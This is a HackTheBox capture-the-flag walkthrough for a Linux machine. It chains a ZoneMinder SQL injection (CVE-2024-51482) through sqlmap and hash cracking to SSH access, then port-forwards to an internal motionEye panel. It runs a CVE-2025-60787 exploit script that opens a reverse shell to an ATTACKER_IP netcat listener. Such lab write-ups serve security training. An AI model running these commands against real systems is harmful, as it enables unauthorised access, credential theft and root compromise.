# CCTV — HackTheBox Walkthrough

**Platform:** HackTheBox | **OS:** Linux

## Attack Chain

ZoneMinder SQL injection via CVE-2024-51482 dumps a bcrypt hash from the database. Cracking it with hashcat gives SSH access. Internal motionEye instance exposed via port forwarding is vulnerable to CVE-2025-60787 — delivers a root shell.

## Enumeration

```
nmap -sV -sC 10.129.53.160 -Pn

22/tcp open  ssh     OpenSSH 9.6p1 (Ubuntu)
80/tcp open  http    Apache 2.4.58 — SecureVision CCTV & Security Solutions
```

Added cctv.htb to /etc/hosts. Port 80 hosted a ZoneMinder installation.

## CVE-2024-51482 — ZoneMinder SQL Injection

CVE-2024-51482 is a SQL injection vulnerability in ZoneMinder's login endpoint. The username parameter is unsanitised, allowing database extraction.

```
sqlmap -u "http://cctv.htb/zm/index.php" \
  --data="username=admin&password=admin&action=login" \
  --dbms=mysql --dump --batch
```

Extracted a bcrypt password hash from the users table.

## Hash Cracking

```
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Password cracked.

## SSH Foothold

```
ssh <user>@10.129.53.160
```

User flag retrieved. Checked for internal services.

```
ss -tlnp
# 127.0.0.1:8765 — motionEye CCTV management panel
```

Forwarded the port.

```
ssh -L 8765:127.0.0.1:8765 <user>@10.129.53.160
```

## CVE-2025-60787 — motionEye RCE

CVE-2025-60787 is an authenticated RCE in motionEye. With access to the internal panel, arbitrary commands execute as root.

```
nc -lvnp 4444
python3 exploit_CVE-2025-60787.py --url http://127.0.0.1:8765 --lhost <ATTACKER_IP> --lport 4444
```

Root shell obtained. Root flag at `/root/root.txt`.

---

*For educational purposes only. Only test systems you own or have explicit permission to test.*
